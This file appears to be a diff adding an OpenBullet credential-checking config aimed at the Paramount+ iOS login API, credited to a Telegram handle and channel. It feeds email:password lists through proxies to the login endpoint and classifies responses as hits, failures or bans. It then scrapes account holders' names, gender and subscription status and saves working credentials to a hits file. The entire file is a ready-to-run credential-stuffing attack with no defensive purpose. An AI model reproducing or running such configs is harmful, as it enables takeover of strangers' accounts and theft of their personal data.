@@ -1,0 +1,111 @@
+[SETTINGS]
+{
+  "Name": "paramountplus.com IOS Api",
+  "SuggestedBots": 100,
+  "MaxCPM": 0,
+  "LastModified": "2021-05-19T14:13:42.2032061+04:30",
+  "AdditionalInfo": "Telegram Channel: https://t.me/OpenBulletChannel",
+  "Author": "@Hogo_Victor",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [
+    {
+      "Description": "Author Telegram Id:@Hogo_Victor",
+      "VariableName": "",
+      "Id": 378934935
+    }
+  ],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#Login REQUEST POST "https://www.paramountplus.com/apps-api/v2.0/iphone/auth/login.json?at=ABAyMzU5NDQzNzQ2ODc2NjEx8eakrwXzuSVqVSk6LEJrbKVt5mLuAVYzqQL2R/qYj16wU0tfC3CxZFB8jXQwKUxm" EncodeContent=TRUE 
+  CONTENT "_remember_me=NO&j_password=<PASS>&j_username=<USER>&locale=en-US" 
+  CONTENTTYPE "application/x-www-form-urlencoded; charset=utf-8" 
+  HEADER "Host: www.paramountplus.com" 
+  HEADER "Accept: */*" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+  HEADER "User-Agent: PPlus/8.0.16 (com.cbsvideo.app; build:3671; iOS 14.5.1) Alamofire/5.2.1" 
+  HEADER "Accept-Language: en-US;q=1.0, fa-US;q=0.9" 
+  HEADER "Connection: close" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "Invalid username/password pair" 
+  KEYCHAIN Success OR 
+    KEY "success\":true}" 
+  KEYCHAIN Ban OR 
+    KEY "<RESPONSECODE>" EqualTo "406" 
+    KEY "<RESPONSECODE>" EqualTo "403" 
+
+#Get REQUEST GET "https://www.paramountplus.com/apps-api/v3.0/iphone/login/status.json?at=ABAyMzU5NDQzNzQ2ODc2NjEx8eakrwXzuSVqVSk6LEJrbKVt5mLuAVYzqQL2R/qYj16wU0tfC3CxZFB8jXQwKUxm&locale=en-US" 
+  
+  HEADER "Host: www.paramountplus.com" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: PPlus/8.0.16 (com.cbsvideo.app; build:3671; iOS 14.5.1) Alamofire/5.2.1" 
+  HEADER "Accept-Language: en-US;q=1.0, fa-US;q=0.9" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+  HEADER "Connection: close" 
+
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Custom "FREE" OR 
+    KEY "packageStatus\":\"TRIAL" 
+    KEY "CANCELLED" 
+    KEY "isAdFree\":false" 
+  KEYCHAIN Ban OR 
+    KEY "<RESPONSECODE>" EqualTo "406" 
+    KEY "<RESPONSECODE>" EqualTo "403" 
+
+#lastName PARSE "<SOURCE>" JSON "lastName" CreateEmpty=FALSE -> CAP "lastName" 
+
+#firstName PARSE "<SOURCE>" JSON "firstName" CreateEmpty=FALSE -> CAP "firstName" 
+
+#gender PARSE "<SOURCE>" JSON "gender" CreateEmpty=FALSE -> CAP "gender" 
+
+#Subscription PARSE "<SOURCE>" JSON "packageCode" CreateEmpty=FALSE -> CAP "Subscription" 
+
+#packageStatus PARSE "<SOURCE>" JSON "packageStatus" CreateEmpty=FALSE -> CAP "packageStatus" 
+
+#isAdFree PARSE "<SOURCE>" JSON "isAdFree" CreateEmpty=FALSE -> CAP "isAdFree" 
+
+#Telegram_Channel FUNCTION Constant "https://t.me/OpenBulletChannel" -> CAP "Telegram Channel" 
+
+#Save UTILITY File "paramountplus.com hits.txt" Append "<USER>:<PASS>\\nlastName: <lastName>\\nfirstName: <firstName>\\nSubscription: <Subscription>\\npackageStatus: <packageStatus>\\nTelegram Channel: https://t.me/OpenBulletChannel\\n-------------------------------------------------------------------------\\n" -> VAR "Save" 
+
